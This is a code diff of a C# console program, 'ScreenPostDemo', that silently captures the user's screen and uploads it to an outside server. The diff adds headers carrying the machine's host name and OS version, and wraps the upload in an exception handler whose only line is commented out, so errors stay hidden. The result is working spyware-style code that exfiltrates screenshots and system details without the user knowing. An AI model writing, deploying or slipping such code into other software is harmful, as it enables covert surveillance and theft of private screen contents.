@@ -35,18 +35,32 @@ namespace ScreenPostDemo
 			}
 		}
 
-		static void Main(string[] args)
+		private static void DoWork()
 		{
 			//File.WriteAllBytes(@"Z:\.Trash\kk.png", TakeSnapShot(true));
 
 			var data = Convert.ToBase64String(TakeSnapShot(true));
 			var client = new WebClient();
+			client.Headers.Add("X-Dab-HostName", Dns.GetHostName());
+			client.Headers.Add("X-Dab-OsVersion", Environment.OSVersion.ToString());
 
 			using (var stream = client.OpenWrite("http://www2.unsec.net/usb/upload.php"))
 			{
 				var body = Encoding.UTF8.GetBytes(data);
 				stream.Write(body, 0, body.Length);
 				stream.Flush();
+			}
+		}
+
+		static void Main(string[] args)
+		{
+			try
+			{
+				DoWork();
+			}
+			catch (Exception ex)
+			{
+				//Console.WriteLine(ex.ToString());
 			}
 		}
 	}
